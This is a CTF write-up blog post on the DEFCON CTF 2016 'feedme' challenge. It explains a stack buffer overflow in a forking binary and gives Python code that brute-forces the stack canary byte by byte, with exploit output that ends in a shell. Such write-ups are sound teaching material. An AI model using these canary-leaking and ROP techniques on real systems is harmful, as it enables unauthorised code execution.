<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="DEFCON CTF 2016 - feedme" prefix="og: http://ogp.me/ns#" property=og:title><meta content="DEFCON CTF 2016 - feedme - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-05-23-defcon-ctf-2016-feedme property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="DEFCON CTF 2016 - feedme - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-05-23-defcon-ctf-2016-feedme name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2016-05-23-defcon-ctf-2016-feedme",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description": DEFCON CTF 2016 - feedme - by hugsy",
      
    }
    </script><title>
  DEFCON CTF 2016 - feedme
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>DEFCON CTF 2016 - feedme</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 23 May 2016 <br> <br> <i>Reading time: 5 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><h3 id=info>Info</h3><p>The vulnerable file was given with the instructions:<pre style=color:#c0c5ce;background-color:#2b303b><code><span>:::text
</span><span>Don't forget to feed me
</span><span>http://www.scs.stanford.edu/brop/
</span></code></pre><p>Here are some info given by <code>gef</code>:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  !file ./feedme
</span><span style=color:#bf616a>./feedme:</span><span> ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)</span><span style=color:#bf616a>,</span><span> statically linked, for GNU/Linux 2.6.24, stripped
</span><span style=color:#bf616a>gef➤</span><span>  checksec
</span><span style=color:#bf616a>[+]</span><span> checksec for '</span><span style=color:#a3be8c>/home/vagrant/feedme</span><span>'
</span><span style=color:#bf616a>Canary:</span><span>                                           No
</span><span style=color:#bf616a>NX</span><span> Support:                                       Yes
</span><span style=color:#bf616a>PIE</span><span> Support:                                      No
</span><span style=color:#bf616a>RPATH:</span><span>                                            No
</span><span style=color:#bf616a>RUNPATH:</span><span>                                          No
</span><span style=color:#bf616a>Partial</span><span> RelRO:                                    No
</span><span style=color:#bf616a>Full</span><span> RelRO:                                       No
</span></code></pre><p><code>feedme</code> is statically linked x86 binary that forks and then expects “to be fed” with some input. Pretty simple, right?<h3 id=vulnerability>Vulnerability</h3><p>The vulnerability in this case is easy to spot:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  c
</span><span style=color:#bf616a>Continuing.
</span><span style=color:#bf616a>[New</span><span> process 1349]
</span><span style=color:#bf616a>FEED</span><span> ME!
</span><span style=color:#bf616a>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span style=color:#bf616a>ATE</span><span> 41414141414141414141414141414141...
</span><span style=color:#bf616a>***</span><span> stack smashing detected ***: /home/vagrant/feedme terminated
</span><span>
</span><span style=color:#bf616a>Program</span><span> received signal SIGABRT, Aborted.
</span><span style=color:#bf616a>[Switching</span><span> to process 1349]
</span><span style=color:#bf616a>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[registers]──
</span><span>$</span><span style=color:#bf616a>eax</span><span>     0x00000000 $</span><span style=color:#bf616a>ebx</span><span>     0x00000545 $</span><span style=color:#bf616a>ecx</span><span>     0x00000545 $</span><span style=color:#bf616a>edx</span><span>     0x00000006 $</span><span style=color:#bf616a>esp</span><span>     0xffffd388 $</span><span style=color:#bf616a>ebp</span><span>     0xffffd5f8
</span><span>$</span><span style=color:#bf616a>esi</span><span>     0xffffd518 $</span><span style=color:#bf616a>edi</span><span>     0xffffd434 $</span><span style=color:#bf616a>eip</span><span>     0xf7ffdba0 $</span><span style=color:#bf616a>cs</span><span>      0x00000023 $</span><span style=color:#bf616a>ss</span><span>      0x0000002b $</span><span style=color:#bf616a>ds</span><span>      0x0000002b
</span><span>$</span><span style=color:#bf616a>es</span><span>      0x0000002b $</span><span style=color:#bf616a>fs</span><span>      0x00000000 $</span><span style=color:#bf616a>gs</span><span>      0x00000063 $</span><span style=color:#bf616a>eflags  </span><span style=color:#b48ead>[</span><span> IF </span><span style=color:#b48ead>]
</span><span style=color:#bf616a>Flags: </span><span style=color:#b48ead>[</span><span> carry  parity  adjust  zero  sign  trap  INTERRUPT  direction  overflow  resume  virtualx86  identification </span><span style=color:#b48ead>]
</span><span style=color:#bf616a>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[stack]──
</span><span style=color:#bf616a>0xffffd388│+0x00:</span><span> 0xffffd5f8 → 0xffffd678 → 0x41414141		← $</span><span style=color:#bf616a>sp
</span><span style=color:#bf616a>0xffffd38c│+0x04:</span><span> 0x6
</span><span style=color:#bf616a>0xffffd390│+0x08:</span><span> 0x545
</span><span style=color:#bf616a>0xffffd394│+0x0c:</span><span> 0x0807bed7 → cmp eax,0xfffff000
</span><span style=color:#bf616a>0xffffd398│+0x10: </span><span>"</span><span style=color:#a3be8c>A</span><span>"
</span><span style=color:#bf616a>0xffffd39c│+0x14:</span><span> 0x0804e3e1 → mov edx,DWORD PTR gs:0x8
</span><span style=color:#bf616a>0xffffd3a0│+0x18:</span><span> 0x6
</span><span style=color:#bf616a>0xffffd3a4│+0x1c:</span><span> 0xffffd3b4 → " "
</span><span style=color:#bf616a>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[code:i386]──
</span><span style=color:#bf616a>0xf7ffdb9b	 </span><span><__kernel_vsyscall+11>  nop
</span><span style=color:#bf616a>0xf7ffdb9b	 </span><span><__kernel_vsyscall+11>  nop
</span><span style=color:#bf616a>0xf7ffdb9c	 </span><span><__kernel_vsyscall+12>  nop
</span><span style=color:#bf616a>0xf7ffdb9d	 </span><span><__kernel_vsyscall+13>  nop
</span><span style=color:#bf616a>0xf7ffdb9e	 </span><span><__kernel_vsyscall+14>  int    0x80
</span><span style=color:#bf616a>0xf7ffdba0	 </span><span><__kernel_vsyscall+16>  pop    ebp 		 ← $</span><span style=color:#bf616a>pc
</span><span style=color:#bf616a>[...]
</span></code></pre><p>The interesting function is at 0x08049036:</p><a href=https://i.imgur.com/WLAWsAW.png target=_blank> <img alt=do-feedme src=https://i.imgur.com/WLAWsAW.png title=do-feedme width=100%> </a><p>This function basically will:<ol><li><code>0x8049053-0x8049058</code>: call the <code>xread_char()</code> function, which will read 1 character from stdin and store it in the stack variable (called <code>len</code>);<li><code>0x804905F-0x8049069</code>: use this variable as the number of byte to read from stdin in the call to <code>xread_buffer()</code>, and store the result in the stack buffer allocated, called <code>buf</code>, whose size is 0x20 bytes;<li><code>0x804907E-0x8049084</code>: copy the <code>buf</code> content to a bigger array (0x400 bytes) located at the address 0x80EBF40.<li><code>0x804909D-0x80490A7</code>check if the <code>canary</code> variable has been tampered with, if so leave in error.</ol><p>So we have a traditional stack buffer overflow, where we need to bypass the canary token.<h3 id=exploitation>Exploitation</h3><p>Before continuing, I would recommend reading the paper & slides related to the <a rel="noopener nofollow noreferrer" href=http://www.scs.stanford.edu/brop/ target=_blank>blind-rop technique</a> we’re going to be using.<p>Since the child process is being forked, we know that the parent and child are identical in every way, including the memory mapping and the canary token. So the idea for this exploitation is to brute-force one-by-one all the bytes from the canary variable in stack, with the following binary logic: overwrite one byte of the canary with a value, <code>X</code>. If we have a crash, it will mean that the canary is corrupted, and therefore <code>X</code> is not valid. If it does not crash, then <code>X</code> is valid, and we can reproduce this action with the following canary byte (this is very analog to the exploitation of a colour-blind SQL injection exploitation).<p>So we have this buffer:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>| </span><span style=color:#bf616a>A</span><span> A A A A A A A A A A A A A A| </span><span style=color:#bf616a>1</span><span> 2 3 4|
</span></code></pre><p>If we attempt to corrupt the first byte of the canary with a wrong value, our process will be killed immediately and we will receive the message (“Child exit”):<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span>| </span><span style=color:#bf616a>A</span><span> A A A A A A A A A A A A A A| </span><span style=color:#bf616a>X</span><span> 2 3 4|
</span></code></pre><p>But when the value for the byte is valid, the program will continue its execution at 0x080490DF and display a message (“YUM, got…”).<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>080490DF</span><span> mov     </span><span style=color:#b48ead>[</span><span>esp+4</span><span style=color:#b48ead>]</span><span>, eax
</span><span style=color:#bf616a>080490E3</span><span> mov     dword ptr </span><span style=color:#b48ead>[</span><span>esp</span><span style=color:#b48ead>]</span><span>, offset aYumGotDBytes ; "</span><span style=color:#a3be8c>YUM, got %d bytes!\n</span><span>"
</span><span style=color:#bf616a>080490EA</span><span> call    xprintf
</span></code></pre><p>So leaking one byte can be summed with the following Python code:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>leak_canary_byte</span><span>(</span><span style=color:#bf616a>s</span><span>, </span><span style=color:#bf616a>prefix</span><span>, </span><span style=color:#bf616a>off</span><span>):
</span><span>    </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>256</span><span>):
</span><span>        p = '</span><span style=color:#a3be8c>A</span><span>'*</span><span style=color:#d08770>32 </span><span>+ prefix + </span><span style=color:#96b5b4>chr</span><span>(i)
</span><span>        </span><span style=color:#bf616a>xsend</span><span>(s, p, </span><span style=color:#96b5b4>len</span><span>(p) )
</span><span>        res = s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#96b5b4>\n</span><span>")
</span><span>        res2 = s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#96b5b4>\n</span><span>")
</span><span>        </span><span style=color:#b48ead>if </span><span>res2 != "</span><span style=color:#a3be8c>Child exit.</span><span style=color:#96b5b4>\n</span><span>":      </span><span style=color:#65737e># if we don't get the "Child exit." message, then our current value is correct
</span><span>            </span><span style=color:#b48ead>return </span><span style=color:#96b5b4>chr</span><span>(i)
</span><span>    </span><span style=color:#b48ead>return </span><span style=color:#d08770>None
</span></code></pre><p>Once we have the value of the first byte, we resume the same operation with the 2nd and so on, until having the 4 bytes forming the canary.<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>def </span><span style=color:#8fa1b3>leak_canary</span><span>(</span><span style=color:#bf616a>s</span><span>):
</span><span>    can = ""
</span><span>    </span><span style=color:#b48ead>for </span><span>i </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>range</span><span>(</span><span style=color:#d08770>4</span><span>):
</span><span>        b = </span><span style=color:#bf616a>leak_canary_byte</span><span>(s, can, i)
</span><span>        </span><span style=color:#b48ead>if </span><span>b is </span><span style=color:#d08770>None</span><span>:
</span><span>            </span><span style=color:#bf616a>err</span><span>("</span><span style=color:#a3be8c>bail</span><span>")
</span><span>            </span><span style=color:#bf616a>exit</span><span>(</span><span style=color:#d08770>1</span><span>)
</span><span>        </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Found canary[</span><span style=color:#d08770>%d</span><span style=color:#a3be8c>]=</span><span style=color:#d08770>%.2x</span><span>"%(i, </span><span style=color:#96b5b4>ord</span><span>(b)))
</span><span>        can += b
</span><span>    </span><span style=color:#b48ead>return </span><span>can
</span></code></pre><p>We know control the execution flow without triggering the <code>canary_fail()</code> function. All we need to do is build the shellcode using regular ROP. Since the binary is statically compiled, we have more gadgets than we need.<p>So wrap this all up in a <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/0f196cfb8c62a4c56fdbc424cb7883bf target=_blank>final exploit</a> and you have code execution:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>/</span><span> $ ./feedme.py                                                                                                                                                                             </span><span style=color:#b48ead>[</span><span>18:58</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>[+]</span><span> Connected to 172.28.128.4:4092
</span><span style=color:#bf616a>[+]</span><span> Leaking canary using BROP
</span><span style=color:#bf616a>[+]</span><span> Found canary</span><span style=color:#b48ead>[</span><span>0</span><span style=color:#b48ead>]</span><span>=00
</span><span style=color:#bf616a>[+]</span><span> Found canary</span><span style=color:#b48ead>[</span><span>1</span><span style=color:#b48ead>]</span><span>=0c
</span><span style=color:#bf616a>[+]</span><span> Found canary</span><span style=color:#b48ead>[</span><span>2</span><span style=color:#b48ead>]</span><span>=77
</span><span style=color:#bf616a>[+]</span><span> Found canary</span><span style=color:#b48ead>[</span><span>3</span><span style=color:#b48ead>]</span><span>=9a
</span><span style=color:#bf616a>[+]</span><span> Using canary '</span><span style=color:#a3be8c>0x9a770c00</span><span>'
</span><span style=color:#bf616a>[+]</span><span> Building shellcode
</span><span style=color:#bf616a>[+]</span><span> Sending shellcode
</span><span style=color:#bf616a>[+]</span><span> Switching to interactive...
</span><span style=color:#bf616a>[+]</span><span> Get a PTY with '</span><span style=color:#a3be8c> python -c "import pty;pty.spawn(</span><span>'/bin/bash'</span><span style=color:#a3be8c>)"   </span><span>'
</span><span style=color:#bf616a>id
</span><span style=color:#bf616a>uid</span><span>=</span><span style=color:#a3be8c>1000</span><span>(</span><span style=color:#bf616a>vagrant</span><span>) gid=1000(vagrant) </span><span style=color:#bf616a>groups</span><span>=</span><span style=color:#a3be8c>1000</span><span>(</span><span style=color:#bf616a>vagrant</span><span>),4(adm)</span><span style=color:#bf616a>,24</span><span>(cdrom)</span><span style=color:#bf616a>,27</span><span>(sudo)</span><span style=color:#bf616a>,30</span><span>(dip)</span><span style=color:#bf616a>,46</span><span>(plugdev)</span><span style=color:#bf616a>,115</span><span>(lpadmin)</span><span style=color:#bf616a>,116</span><span>(sambashare)
</span><span style=color:#bf616a>You</span><span> ran out of time, closing!
</span></code></pre><p>And find the flag <code>The flag is: It's too bad! we c0uldn't??! d0 the R0P CHAIN BLIND TOO</code><aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/defcon-2016/>#defcon-2016</a> <a href=https://blahcat.github.io/tags/x86/>#x86</a> <a href=https://blahcat.github.io/tags/brop/>#brop</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=DEFCON CTF 2016 - feedme" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-05-24-defcon-ctf-2016-heapfun4u/> <section class=post-nav-teaser><b class=post-nav-title>DEFCON CTF 2016 - heapfun4u</b><p class=post-nav-excerpt>Info The vulnerable file was given with the following instructions: Guess w…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-05-09-asis-ctf-2016-feap/> <section class=post-nav-teaser><b class=post-nav-title>ASIS CTF 2016 - feap write-up</b><p class=post-nav-excerpt>Info As usual, the vulnerable file is here gef➤ !file ./feap ./feap: ELF 6…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>